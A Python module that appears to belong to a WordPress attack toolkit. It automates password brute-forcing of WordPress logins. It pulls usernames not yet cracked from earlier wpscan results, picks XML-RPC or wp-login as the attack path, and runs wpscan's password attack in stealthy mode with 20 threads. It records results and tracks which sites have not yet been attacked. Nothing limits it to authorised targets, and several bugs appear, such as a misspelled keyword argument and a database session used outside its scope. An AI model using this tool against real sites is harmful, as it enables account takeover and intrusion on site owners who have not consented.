import json
import os
from urllib.parse import urlparse
from input_parser import InputParser
from sqlalchemy import select, exists
from sqlalchemy.orm import selectinload
from wp_config import CONFIG
from wp_db import get_session, Web, FileList, valid_wp_link, BrutalRun
from wp_log import print_e
from wp_scanner import run_command

async def run(raw_args):
    parser = InputParser(description="Brutal Script")
    parser.add_argument('--wp_link', type=str, required=True, help='WordPress link for the enum script')
    parser.add_argument("--pass_list", type=str, required=True)
    parser.add_argument("--user_list", type=str)
    parser.add_argument("--skip_no_xmlrcp", action="store_true")

    parser.add_argument('--overwrite', action="store_true")

    args = parser.parse_args(raw_args.split())

    if not await valid_wp_link(args.wp_link):
        print_e("Brutal script requires a valid WordPress link")
        return

    await brute(args.wp_link, user_list=args.user_list, pass_list=args.pass_list, skip_no_xmlrcp=args.skip_no_xmlrcp, overwite=args.overwrite)


async def wpscan_get_cracked(wp_link): # get user list from last wpscan
    # get user list for web
    async with get_session() as session:
        web = (await session.execute(
            select(Web).filter(Web.wp_link == wp_link)
        )).scalars().first()

        if web.wpscan is None:
            print_e(f"{wp_link} has no wpscan")
            return False

        not_cracked = []
        if not web.cracked is None:
            with open(web.cracked, 'r') as up:
                not_cracked = [line.split(":")[0] for line in up if line.split(":")[1] != ""]

        user_list = f"{CONFIG['wp_hub']['wordlist_folder']}user/{urlparse(wp_link).netloc}.txt"
        with open(user_list, 'w') as f:
            for username in not_cracked:
                f.write(f"{username}\n")
        return user_list


def check_xmlrpc_enabled(json_file_path)-> (bool, str):
    #TODO multicall settings
    with open(json_file_path, 'r') as file:
        data = json.load(file)
        for finding in data.get('interesting_findings', []):
            if finding.get('type') == 'xmlrpc':
                if "XML-RPC seems to be enabled" in finding.get('to_s', ''):
                    return True, "xmlrpc"
    return False, "wp-login"



async def brute(wp_link, user_list=None, pass_list=None, skip_no_xmlrcp=False, overwrite=False):

    if user_list is None:
        user_list = await wpscan_get_cracked(wp_link)
        if user_list is False:
            return

    last_wpscan = None
    async with get_session() as session:
        last_wpscan = (await session.execute(
            select(Web.wpscan).where(Web.wp_link == wp_link)
        )).scalars().first()

    xml_enabled, xml_type = check_xmlrpc_enabled(last_wpscan)

    if not xml_enabled:
        if skip_no_xmlrcp:
            print_e(f"{wp_link} No xmlrcp, skipping")
            return

    output_path = f"{CONFIG['wp_hub']['output_folder']}wpscan_brute/{urlparse(wp_link).netloc}.json"
    if os.path.exists(output_path) and not overwrite:
        print_e(f"Brutal output already exists at {output_path}")
        return

    await run_command(
        "wpscan --url {} --password-attack {} --usernames {} --passwords {} -t {} --stealthy -f json -o {}"
        .format(wp_link, xml_type, user_list, pass_list, 20, output_path))

    result = await session.execute(
        select(Web).options(selectinload(Web.file_lists)).filter_by(wp_link=wp_link)
    )
    web_instance = result.scalars().first()

    if not web_instance:
        print_e(web_instance + "is not a valid web instance")
        return

    result = await session.execute(
        select(FileList).filter_by(path=output_path)
    )
    file_list_instance = result.scalars().first()

    if not file_list_instance:
        file_list_instance = FileList(
            path=output_path,
            list_type="brutal"
        )
        session.add(file_list_instance)
        await session.commit()

    brutal_run = BrutalRun(
        file_list_path=output_path,
        wp_link=wp_link,
        path=output_path
    )
    session.add(brutal_run)
    await session.commit()

async def get_webs_without_brutal_run():
    async with get_session() as session:
        return (await session.execute(
            select(Web).where(
                ~exists().where(Web.wp_link == BrutalRun.wp_link)
            )
        )).scalars().all()
